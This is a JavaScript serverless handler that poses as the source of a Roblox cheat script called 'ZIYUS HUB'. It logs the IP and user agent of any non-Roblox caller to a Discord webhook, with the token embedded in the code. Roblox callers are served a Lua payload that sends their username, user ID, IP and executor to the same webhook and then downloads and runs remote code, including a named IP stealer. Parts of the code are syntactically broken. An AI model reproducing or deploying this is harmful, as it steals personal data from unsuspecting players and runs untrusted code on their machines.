export default async function handler(req, res) {
  const url = new URL(req.url, `https://${req.headers.host}`);
  
  const realIp = req.headers['x-forwarded-for']?.split(',')[0].trim() ||
                 req.headers['x-real-ip'] ||
                 req.headers['cf-connecting-ip'] ||
                 req.headers['x-vercel-forwarded-for'] ||
                 req.socket.remoteAddress || 'Unknown';

  const userAgent = req.headers['user-agent'] || '';
  const referer = req.headers['referer'] || 'Direct';

  const WEBHOOK = 'https://discord.com/api/webhooks/1444992746854289408/xElRiKCryMi--rjyZeQYnF4fozUJmW4-pRYpPZ-5cgD4BmrRlr7LTH-aoxrm07VQL2nz';

  const isRoblox = /Roblox|RobloxStudio/i.test(userAgent);
  const isBot = /curl|wget|fetch|python|axios|postman|got|http|bot/i.test(userAgent) || userAgent.length < 50;

  if (!isRoblox || isBot) {
    await fetch(WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: isRoblox ? "Fake Roblox UA Detected" : "Skidder Blocked",
          color: 16711680,
          fields: [
            { name: "IP", value: realIp },
            { name: "User-Agent", value: userAgent.slice(0, 1000) },
            { name: "Referer", value: referer }
          ],
          timestamp: new Date().toISOString()
        }]
      })
    });

    return res.status(200).send(isRoblox 
      ? "ANO I-FEFETCH MOPA? BOBOKA" 
      : "ZIYUS DETECTED YOU EASY IP GRABBED !");
  }

  const payload = `-- ZIYUS HUB | Works on PC · Mobile · Console
spawn(function()
    local HttpService = game:GetService("HttpService")
    local Players = game:GetService("Players")
    local plr = Players.LocalPlayer

    if plr then
        pcall(function()
            local request = (syn and syn.request) 
                         or (Krnl and Krnl.request) 
                         or (http and http.request) 
                         or (http_request) 
                         or request 
                         or (fluxus and fluxus.request)

            if request then
                request({
                    Url = "${WEBHOOK}",
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode({
                        embeds = {{
                            title = "Executed ZIYUS HUB",
                            description = "Victim just ran your script",
                            color = 65433,
                            fields = {
                                {name = "Username", value = plr.Name, inline = true},
                                {name = "UserID", value = tostring(plr.UserId), inline = true},
                                {name = "DisplayName", value = plr.DisplayName, inline = true},
                                {name = "IP Address", value = "${realIp}", inline = false},
                                {name = "User-Agent", value = "${userAgent.replace(/"/g, '\\"').slice(0, 0, 500)}", inline = false},
                                {name = "Executor", value = (syn and "Synapse X") or (Krnl and "Krnl") or (fluxus and "Fluxus") or "Unknown", inline = true}
                            },
                            thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId="..plr.UserId.."&width=420&height=420&format=png"},
                            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
                        }}
                    })
                })
            end
        end)
    end
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/Secret-Employee-Hub/SCRIPT-KIDDIE/refs/heads/main/noskidding"))()

pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/laagginq/public/main/ip-loggers/webrtc-localip-stealer.lua"))()
end)`;

  await fetch(WEBHOOK, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      embeds: [{
        title = "Script Served Successfully",
        color: 65331,
        fields: [
          [{ name: "Victim IP", value: realIp }],
        timestamp: new Date().toISOString()
      }]
    })
  });

  res.setHeader('Content-Type', 'text/plain');
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
  res.status(200).send(payload);
}

export const config = {
  api: {
    bodyParser: false,
  },
};
